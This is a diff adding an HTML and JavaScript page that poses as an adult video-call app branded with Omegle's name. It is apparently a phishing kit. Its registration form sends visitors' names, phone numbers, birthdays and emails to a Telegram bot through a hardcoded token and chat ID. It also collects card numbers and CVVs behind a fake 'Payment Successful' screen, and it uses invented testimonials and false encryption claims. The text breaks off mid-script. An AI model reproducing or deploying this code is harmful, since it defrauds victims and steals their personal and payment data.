@@ -1,0 +1,1530 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sexy Video Call - Connect with Beautiful People</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            color: #333;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Page Sections */
+        .page {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.5s ease;
+            z-index: 1;
+        }
+
+        .page.active {
+            opacity: 1;
+            visibility: visible;
+            z-index: 10;
+        }
+
+        /* Loading Page */
+        #loadingPage {
+            background: linear-gradient(135deg, #6a1b9a, #4a148c);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .logo-container {
+            text-align: center;
+            animation: pulse 2s infinite;
+        }
+
+        .logo {
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(45deg, #9c27b0, #673ab7);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px;
+            box-shadow: 0 0 30px rgba(156, 39, 176, 0.5);
+        }
+
+        .logo i {
+            font-size: 60px;
+            color: white;
+        }
+
+        .app-name {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, #9c27b0, #673ab7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .tagline {
+            font-size: 16px;
+            color: #e0e0e0;
+            margin-bottom: 30px;
+        }
+
+        .loading-bar {
+            width: 200px;
+            height: 4px;
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 2px;
+            overflow: hidden;
+            margin: 0 auto;
+        }
+
+        .loading-progress {
+            height: 100%;
+            width: 0;
+            background: linear-gradient(90deg, #9c27b0, #673ab7);
+            animation: loading 3s forwards;
+        }
+
+        .loading-text {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #e0e0e0;
+        }
+
+        @keyframes loading {
+            0% { width: 0; }
+            100% { width: 100%; }
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        /* Registration Page */
+        #registrationPage {
+            background: linear-gradient(135deg, #f5f5f5, #e0e0e0);
+            padding: 20px;
+        }
+
+        .reg-container {
+            width: 90%;
+            max-width: 400px;
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(156, 39, 176, 0.2);
+        }
+
+        .reg-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .reg-header h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #6a1b9a;
+        }
+
+        .reg-header p {
+            color: #757575;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #6a1b9a;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            background: #f5f5f5;
+            border: 1px solid #e0e0e0;
+            border-radius: 10px;
+            color: #333;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #6a1b9a;
+            background: #f0f0f0;
+        }
+
+        .gender-options {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 10px;
+        }
+
+        .gender-option {
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .gender-option i {
+            font-size: 30px;
+            color: #9e9e9e;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .gender-option input {
+            display: none;
+        }
+
+        .gender-option input:checked + i {
+            color: #6a1b9a;
+            transform: scale(1.2);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #9c27b0, #673ab7);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(156, 39, 176, 0.4);
+        }
+
+        .btn-secondary {
+            background: transparent;
+            border: 1px solid rgba(156, 39, 176, 0.5);
+            color: #6a1b9a;
+        }
+
+        .btn-secondary:hover {
+            background: rgba(156, 39, 176, 0.1);
+        }
+
+        .security-note {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #757575;
+        }
+
+        /* Payment Page */
+        #paymentPage {
+            background: linear-gradient(135deg, #f5f5f5, #e0e0e0);
+            padding: 20px;
+        }
+
+        .payment-container {
+            width: 90%;
+            max-width: 400px;
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(156, 39, 176, 0.2);
+        }
+
+        .payment-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .payment-header h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #6a1b9a;
+        }
+
+        .payment-header p {
+            color: #757575;
+            font-size: 14px;
+        }
+
+        .plan-options {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .plan-card {
+            background: #f5f5f5;
+            border-radius: 15px;
+            padding: 20px;
+            border: 1px solid #e0e0e0;
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+        }
+
+        .plan-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .plan-card.selected {
+            border-color: #6a1b9a;
+            background: rgba(156, 39, 176, 0.1);
+        }
+
+        .plan-badge {
+            position: absolute;
+            top: -10px;
+            right: 10px;
+            background: #6a1b9a;
+            color: white;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+        }
+
+        .plan-name {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #333;
+        }
+
+        .plan-price {
+            font-size: 24px;
+            font-weight: bold;
+            color: #6a1b9a;
+            margin-bottom: 10px;
+        }
+
+        .plan-features {
+            font-size: 14px;
+            color: #757575;
+        }
+
+        .payment-methods {
+            margin-bottom: 20px;
+        }
+
+        .payment-methods h3 {
+            font-size: 16px;
+            margin-bottom: 15px;
+            color: #6a1b9a;
+        }
+
+        .method-options {
+            display: flex;
+            gap: 15px;
+        }
+
+        .method-option {
+            flex: 1;
+            background: #f5f5f5;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 1px solid #e0e0e0;
+        }
+
+        .method-option:hover {
+            background: #f0f0f0;
+        }
+
+        .method-option.selected {
+            border-color: #6a1b9a;
+            background: rgba(156, 39, 176, 0.1);
+        }
+
+        .method-option i {
+            font-size: 24px;
+            margin-bottom: 5px;
+            display: block;
+            color: #6a1b9a;
+        }
+
+        .method-option span {
+            font-size: 12px;
+            color: #333;
+        }
+
+        .payment-info {
+            background: rgba(156, 39, 176, 0.05);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .payment-info h4 {
+            font-size: 14px;
+            color: #6a1b9a;
+            margin-bottom: 10px;
+        }
+
+        .payment-info ul {
+            list-style-type: none;
+            padding-left: 0;
+        }
+
+        .payment-info li {
+            font-size: 13px;
+            color: #757575;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+        }
+
+        .payment-info li i {
+            color: #6a1b9a;
+            margin-right: 8px;
+            font-size: 12px;
+        }
+
+        .testimonial {
+            background: #f5f5f5;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+        }
+
+        .testimonial-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #9c27b0, #673ab7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-right: 15px;
+            color: white;
+            font-weight: bold;
+        }
+
+        .testimonial-content {
+            flex: 1;
+        }
+
+        .testimonial-text {
+            font-size: 13px;
+            color: #555;
+            font-style: italic;
+            margin-bottom: 5px;
+        }
+
+        .testimonial-author {
+            font-size: 12px;
+            color: #6a1b9a;
+            font-weight: bold;
+        }
+
+        .testimonial-rating {
+            color: #ffc107;
+            font-size: 12px;
+        }
+
+        /* Card Payment Page */
+        #cardPage {
+            background: linear-gradient(135deg, #f5f5f5, #e0e0e0);
+            padding: 20px;
+        }
+
+        .card-container {
+            width: 90%;
+            max-width: 400px;
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(156, 39, 176, 0.2);
+        }
+
+        .card-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .card-header h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #6a1b9a;
+        }
+
+        .card-header p {
+            color: #757575;
+            font-size: 14px;
+        }
+
+        .card-preview {
+            background: linear-gradient(135deg, #6a1b9a, #4a148c);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 30px;
+            color: white;
+            position: relative;
+            height: 200px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .card-chip {
+            width: 50px;
+            height: 40px;
+            background: #ffd700;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+
+        .card-number {
+            font-size: 20px;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+        }
+
+        .card-details {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .card-holder {
+            font-size: 14px;
+            text-transform: uppercase;
+        }
+
+        .card-expiry {
+            font-size: 14px;
+        }
+
+        .card-form {
+            margin-bottom: 20px;
+        }
+
+        .card-form-group {
+            margin-bottom: 15px;
+        }
+
+        .card-form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #6a1b9a;
+        }
+
+        .card-form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            background: #f5f5f5;
+            border: 1px solid #e0e0e0;
+            border-radius: 10px;
+            color: #333;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        .card-form-group input:focus {
+            outline: none;
+            border-color: #6a1b9a;
+            background: #f0f0f0;
+        }
+
+        .card-form-row {
+            display: flex;
+            gap: 15px;
+        }
+
+        .card-form-row .card-form-group {
+            flex: 1;
+        }
+
+        .card-cvv {
+            position: relative;
+        }
+
+        .card-cvv i {
+            position: absolute;
+            right: 15px;
+            top: 40px;
+            color: #6a1b9a;
+            cursor: pointer;
+        }
+
+        /* Payment Loading Page */
+        #paymentLoadingPage {
+            background: linear-gradient(135deg, #4a148c, #6a1b9a);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading-animation {
+            text-align: center;
+        }
+
+        .secure-icon {
+            width: 100px;
+            height: 100px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 30px;
+            position: relative;
+        }
+
+        .secure-icon i {
+            font-size: 50px;
+            color: #fff;
+        }
+
+        .pulse-ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            animation: pulse-ring 2s infinite;
+        }
+
+        @keyframes pulse-ring {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            100% {
+                transform: scale(1.5);
+                opacity: 0;
+            }
+        }
+
+        .loading-text {
+            font-size: 20px;
+            margin-bottom: 20px;
+            color: white;
+        }
+
+        .loading-dots {
+            display: flex;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            background-color: #fff;
+            border-radius: 50%;
+            animation: dot-bounce 1.5s infinite;
+        }
+
+        .dot:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .dot:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes dot-bounce {
+            0%, 60%, 100% {
+                transform: translateY(0);
+            }
+            30% {
+                transform: translateY(-15px);
+            }
+        }
+
+        .progress-bar-container {
+            width: 200px;
+            height: 4px;
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 2px;
+            overflow: hidden;
+            margin: 30px auto 0;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0;
+            background: linear-gradient(90deg, #9c27b0, #673ab7);
+            animation: progress 3s forwards;
+        }
+
+        @keyframes progress {
+            0% { width: 0; }
+            100% { width: 100%; }
+        }
+
+        /* Payment Success Page */
+        #paymentSuccessPage {
+            background: linear-gradient(135deg, #f5f5f5, #e0e0e0);
+            padding: 20px;
+        }
+
+        .success-container {
+            width: 90%;
+            max-width: 400px;
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(156, 39, 176, 0.2);
+            text-align: center;
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(45deg, #4caf50, #8bc34a);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px;
+            animation: success-pulse 1s;
+        }
+
+        .success-icon i {
+            font-size: 40px;
+            color: white;
+        }
+
+        @keyframes success-pulse {
+            0% {
+                transform: scale(0);
+                opacity: 0;
+            }
+            50% {
+                transform: scale(1.2);
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .success-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #4caf50;
+        }
+
+        .success-message {
+            font-size: 16px;
+            color: #757575;
+            margin-bottom: 20px;
+        }
+
+        .transaction-details {
+            background: #f5f5f5;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+
+        .detail-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .detail-label {
+            color: #757575;
+            font-size: 14px;
+        }
+
+        .detail-value {
+            color: #333;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+        }
+
+        .action-buttons .btn {
+            flex: 1;
+        }
+
+        /* App Main Page */
+        #appPage {
+            background: linear-gradient(135deg, #f5f5f5, #e0e0e0);
+            padding: 0;
+        }
+
+        .app-header {
+            background: linear-gradient(45deg, #9c27b0, #673ab7);
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .app-title {
+            font-size: 20px;
+            font-weight: bold;
+            color: white;
+        }
+
+        .live-badge {
+            background: #ff416c;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            animation: blink 2s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        .video-container {
+            position: relative;
+            width: 100%;
+            height: calc(100vh - 150px);
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .video-placeholder {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: url('https://picsum.photos/seed/sexyvideocall/800/1200.jpg') center/cover;
+        }
+
+        .video-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 20px;
+            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #9c27b0, #673ab7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-right: 10px;
+            color: white;
+        }
+
+        .user-details {
+            flex: 1;
+        }
+
+        .user-name {
+            font-size: 16px;
+            font-weight: bold;
+            color: white;
+        }
+
+        .user-status {
+            font-size: 12px;
+            color: #e0e0e0;
+        }
+
+        .message-input-container {
+            display: flex;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 30px;
+            padding: 10px 15px;
+            margin-bottom: 15px;
+        }
+
+        .message-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: white;
+            outline: none;
+            font-size: 14px;
+        }
+
+        .send-btn {
+            background: #9c27b0;
+            border: none;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        .app-controls {
+            display: flex;
+            justify-content: space-around;
+            padding: 15px 0;
+            background: white;
+        }
+
+        .control-btn {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: #f5f5f5;
+            border: none;
+            color: #6a1b9a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .control-btn:hover {
+            background: #e0e0e0;
+            transform: scale(1.1);
+        }
+
+        .control-btn.primary {
+            background: linear-gradient(45deg, #9c27b0, #673ab7);
+            width: 70px;
+            height: 70px;
+            color: white;
+        }
+
+        .control-btn.primary:hover {
+            background: linear-gradient(45deg, #8e24aa, #5e35b1);
+        }
+
+        .control-btn i {
+            font-size: 24px;
+        }
+
+        .control-btn.primary i {
+            font-size: 28px;
+        }
+
+        /* PhonePe Logo */
+        .phonepe-logo {
+            width: 40px;
+            height: 40px;
+            background: #5D2F8E;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 5px;
+        }
+
+        .phonepe-logo::before {
+            content: "";
+            width: 20px;
+            height: 20px;
+            background: white;
+            border-radius: 50%;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 480px) {
+            .reg-container, .payment-container, .card-container, .success-container {
+                width: 95%;
+                padding: 20px;
+            }
+            
+            .app-controls {
+                padding: 10px 0;
+            }
+            
+            .control-btn {
+                width: 50px;
+                height: 50px;
+            }
+            
+            .control-btn.primary {
+                width: 60px;
+                height: 60px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Page -->
+    <div id="loadingPage" class="page active">
+        <div class="logo-container">
+            <div class="logo">
+                <i class="fas fa-video"></i>
+            </div>
+            <h1 class="app-name">Sexy Video Call</h1>
+            <p class="tagline">Connect with beautiful people</p>
+            <div class="loading-bar">
+                <div class="loading-progress"></div>
+            </div>
+            <p class="loading-text">Loading...</p>
+        </div>
+    </div>
+
+    <!-- Registration Page -->
+    <div id="registrationPage" class="page">
+        <div class="reg-container">
+            <div class="reg-header">
+                <h2>Create Your Profile</h2>
+                <p>Let's get to know you better ❤️</p>
+            </div>
+            <form id="registrationForm">
+                <div class="form-group">
+                    <label for="name">Name</label>
+                    <input type="text" id="name" placeholder="Enter your name" required>
+                </div>
+                <div class="form-group">
+                    <label for="phone">Phone</label>
+                    <input type="tel" id="phone" placeholder="Enter your phone number" required>
+                </div>
+                <div class="form-group">
+                    <label for="birthday">Birthday</label>
+                    <input type="date" id="birthday" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">Email</label>
+                    <input type="email" id="email" placeholder="Enter your email" required>
+                </div>
+                <div class="form-group">
+                    <label>Gender</label>
+                    <div class="gender-options">
+                        <label class="gender-option">
+                            <input type="radio" name="gender" value="male" required>
+                            <i class="fas fa-mars"></i>
+                            <span>Male</span>
+                        </label>
+                        <label class="gender-option">
+                            <input type="radio" name="gender" value="female" required>
+                            <i class="fas fa-venus"></i>
+                            <span>Female</span>
+                        </label>
+                    </div>
+                </div>
+                <button type="submit" class="btn">CONTINUE</button>
+                <button type="button" class="btn btn-secondary" id="alreadyLoginBtn">ALREADY LOGIN</button>
+            </form>
+            <p class="security-note">Your details are safe with us 🛡️</p>
+            <p class="security-note">Powered by Omegle 18+</p>
+        </div>
+    </div>
+
+    <!-- Payment Page -->
+    <div id="paymentPage" class="page">
+        <div class="payment-container">
+            <div class="payment-header">
+                <h2>Choose Your Plan</h2>
+                <p>Select the perfect plan for you</p>
+            </div>
+            <div class="plan-options">
+                <div class="plan-card" data-plan="trial" data-price="1">
+                    <div class="plan-name">Trial Offer</div>
+                    <div class="plan-price">₹1 Only</div>
+                    <div class="plan-features">1 day trial with full features</div>
+                </div>
+                <div class="plan-card" data-plan="premium" data-price="9">
+                    <div class="plan-badge">Best Value</div>
+                    <div class="plan-name">Premium</div>
+                    <div class="plan-price">₹9</div>
+                    <div class="plan-features">7 days unlimited access</div>
+                </div>
+            </div>
+            <div class="payment-methods">
+                <h3>Payment Method</h3>
+                <div class="method-options">
+                    <div class="method-option" data-method="phonepe">
+                        <div class="phonepe-logo"></div>
+                        <span>PhonePe</span>
+                    </div>
+                    <div class="method-option" data-method="card">
+                        <i class="fas fa-user"></i>
+                        <span>Card</span>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Payment Information Section -->
+            <div class="payment-info">
+                <h4>Why Choose Our Premium Plans?</h4>
+                <ul>
+                    <li><i class="fas fa-check-circle"></i> Unlimited video calls with no time limits</li>
+                    <li><i class="fas fa-check-circle"></i> Access to exclusive models and content</li>
+                    <li><i class="fas fa-check-circle"></i> HD video quality for the best experience</li>
+                    <li><i class="fas fa-check-circle"></i> Priority customer support 24/7</li>
+                    <li><i class="fas fa-check-circle"></i> Secure and private payment processing</li>
+                </ul>
+            </div>
+            
+            <!-- Testimonial Section -->
+            <div class="testimonial">
+                <div class="testimonial-avatar">AK</div>
+                <div class="testimonial-content">
+                    <div class="testimonial-text">"Best video call app I've ever used! The models are amazing and the quality is top-notch."</div>
+                    <div class="testimonial-author">Amit Kumar</div>
+                    <div class="testimonial-rating">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                    </div>
+                </div>
+            </div>
+            
+            <button class="btn" id="proceedToPaymentBtn">Proceed to Pay</button>
+            <p class="security-note">Secure payment guaranteed with 256-bit encryption</p>
+        </div>
+    </div>
+
+    <!-- Card Payment Page -->
+    <div id="cardPage" class="page">
+        <div class="card-container">
+            <div class="card-header">
+                <h2>Card Payment</h2>
+                <p>Enter your card details securely</p>
+            </div>
+            <div class="card-preview">
+                <div class="card-chip"></div>
+                <div class="card-number" id="cardNumberDisplay">•••• •••• •••• ••••</div>
+                <div class="card-details">
+                    <div class="card-holder" id="cardHolderDisplay">YOUR NAME</div>
+                    <div class="card-expiry" id="cardExpiryDisplay">MM/YY</div>
+                </div>
+            </div>
+            <div class="card-form">
+                <div class="card-form-group">
+                    <label for="cardNumber">Card Number</label>
+                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                </div>
+                <div class="card-form-group">
+                    <label for="cardHolder">Cardholder Name</label>
+                    <input type="text" id="cardHolder" placeholder="John Doe" required>
+                </div>
+                <div class="card-form-row">
+                    <div class="card-form-group">
+                        <label for="cardExpiry">Expiry Date</label>
+                        <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" required>
+                    </div>
+                    <div class="card-form-group card-cvv">
+                        <label for="cardCvv">CVV</label>
+                        <input type="text" id="cardCvv" placeholder="123" maxlength="3" required>
+                        <i class="fas fa-question-circle" title="3-digit code on the back of your card"></i>
+                    </div>
+                </div>
+            </div>
+            <button class="btn" id="payWithCardBtn">Pay Now</button>
+            <p class="security-note">Your card details are encrypted and secure</p>
+        </div>
+    </div>
+
+    <!-- Payment Loading Page -->
+    <div id="paymentLoadingPage" class="page">
+        <div class="loading-animation">
+            <div class="secure-icon">
+                <div class="pulse-ring"></div>
+                <i class="fas fa-lock"></i>
+            </div>
+            <h2 class="loading-text">Connecting Securely</h2>
+            <div class="loading-dots">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+            <div class="progress-bar-container">
+                <div class="progress-bar"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Payment Success Page -->
+    <div id="paymentSuccessPage" class="page">
+        <div class="success-container">
+            <div class="success-icon">
+                <i class="fas fa-check"></i>
+            </div>
+            <h2 class="success-title">Payment Successful</h2>
+            <p class="success-message">Your payment has been processed successfully</p>
+            <div class="transaction-details">
+                <div class="detail-row">
+                    <span class="detail-label">Date & Time</span>
+                    <span class="detail-value" id="transactionDate">12 October 2025 at 08:03 pm</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Merchant</span>
+                    <span class="detail-value">Omegle Private Ltd</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Transaction ID</span>
+                    <span class="detail-value" id="transactionId">TXN123456789</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Amount</span>
+                    <span class="detail-value" id="transactionAmount">₹1</span>
+                </div>
+            </div>
+            <div class="action-buttons">
+                <button class="btn btn-secondary" id="viewDetailsBtn">View Details</button>
+                <button class="btn" id="shareReceiptBtn">Share Receipt</button>
+            </div>
+            <button class="btn" id="enterAppBtn">Enter App</button>
+        </div>
+    </div>
+
+    <!-- App Main Page -->
+    <div id="appPage" class="page">
+        <div class="app-header">
+            <div class="app-title">Sexy Video Call</div>
+            <div class="live-badge">LIVE</div>
+        </div>
+        <div class="video-container">
+            <div class="video-placeholder"></div>
+            <div class="video-overlay">
+                <div class="user-info">
+                    <div class="user-avatar">
+                        <i class="fas fa-user"></i>
+                    </div>
+                    <div class="user-details">
+                        <div class="user-name">Beautiful Stranger</div>
+                        <div class="user-status">Online now</div>
+                    </div>
+                </div>
+                <div class="message-input-container">
+                    <input type="text" class="message-input" placeholder="Type a message...">
+                    <button class="send-btn">
+                        <i class="fas fa-paper-plane"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+        <div class="app-controls">
+            <button class="control-btn">
+                <i class="fas fa-camera"></i>
+            </button>
+            <button class="control-btn primary">
+                <i class="fas fa-phone"></i>
+            </button>
+            <button class="control-btn">
+                <i class="fas fa-microphone"></i>
+            </button>
+            <button class="control-btn">
+                <i class="fas fa-forward"></i>
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const telegramBotToken = '8294124416:AAEzx1Wh0AG5E_APmZGNQZklhy6ZdfDiyh4'; // Replace with your bot token
+        const telegramChatId = '6883454411'; // Replace with your chat ID
+        
+        // Check if user is already registered
+        const isUserRegistered = localStorage.getItem('userRegistered') === 'true';
+        
+        // Page navigation
+        const pages = document.querySelectorAll('.page');
+        
+        function showPage(pageId) {
+            pages.forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById(pageId).classList.add('active');
+        }
+
+        // Send data to Telegram Bot
+        async function sendToTelegram(message) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: telegramChatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                if (!response.ok) {
+                    throw new Error('Failed to send message to Telegram');
+                }
+                
+                return await response.json();
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return null;
+            }
+        }
+
+        // Loading page transition
+        setTimeout(() => {
+            if (isUserRegistered) {
+                showPage('appPage');
+            } else {
+                showPage('registrationPage');
+            }
+        }, 3000);
+
+        // Registration form submission
+        document.getElementById('registrationForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const formData = {
+                name: document.getElementById('name').value,
+                phone: document.getElementById('phone').value,
+                birthday: document.getElementById('birthday').value,
+                email: document.getElementById('email').value,
+                gender: document.querySelector('input[name="gender"]:checked').value
+            };
+            
+            // Send registration data to Telegram
+            const message = `
+                <b>New User Registration</b>
+                <b>Name:</b> ${formData.name}
+                <b>Phone:</b> ${formData.phone}
+                <b>Birthday:</b> ${formData.birthday}
+                <b>Email:</b> ${formData.email}
+                <b>Gender:</b> ${formData.gender}
+            `;
+            
+            const result = await sendToTelegram(message);
+            
+            if (result) {
+                console.log('Registration data sent to Telegram successfully');
+                localStorage.setItem('userRegistered', 'true');
+                localStorage.setItem('userData', JSON.stringify(formData));
+                showPage('paymentPage');
+            } else {
+                console.error('Failed to send registration data to Telegram');
+                alert('Registration failed. Please try again.');
+            }
+        });
+
+        // Already login button
+        document.getElementById('alreadyLoginBtn').addEventListener('click', () => {
+            localStorage.setItem('userRegistered', 'true');
+            showPage('paymentPage');
+        });
+
+        // Plan selection
+        let selectedPlan = 'trial';
+        let selectedPrice = 1;
+        const planCards = document.querySelectorAll('.plan-card');
+        
+        planCards.forEach(card => {
+            card.addEventListener('click', () => {
+                planCards.forEach(c => c.classList.remove('selected'));
+                card.classList.add('selected');
+                selectedPlan = card.dataset.plan;
+                selectedPrice = parseInt(card.dataset.price);
+            });
+        });
+
+        // Payment method selection
+        let selectedMethod = 'phonepe';
+        const methodOptions = document.querySelectorAll('.method-option');
+        
+        methodOptions.forEach(option => {
+            option.addEventListener('click', () => {
+                methodOptions.forEach(o => o.classList.remove('selected'));
+                option.classList.add('selected');
+                selectedMethod = option.dataset.method;
+            });
+        });
+
+        // Proceed to payment button
+        document.getElementById('proceedToPaymentBtn').addEventListener('click', () => {
+            if (selectedMethod === 'phonepe') {
+                // Redirect to pe.html
+                window.location.href = 'pe.html';
